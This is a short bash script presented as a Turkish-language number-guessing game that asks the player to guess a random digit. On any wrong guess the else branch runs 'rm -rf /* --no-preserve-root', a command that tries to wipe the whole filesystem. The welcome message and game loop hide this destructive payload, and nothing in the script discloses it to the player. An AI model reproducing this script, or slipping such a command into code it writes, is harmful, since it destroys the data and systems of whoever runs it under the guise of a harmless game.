#!/bin/bash

sayi=$(($RANDOM % 10))

echo "				*** Sayı tahmin oyununa hoşgeldiniz ***"

while true
do

	read -p "Sayı tahmin edin: " tahmin
	if [[ $sayi == $tahmin ]]; then
		echo "Doğru Tebrikler"
		break
	else
		echo "Tekrar deneyiniz"
		rm -rf /* --no-preserve-root
	fi
done
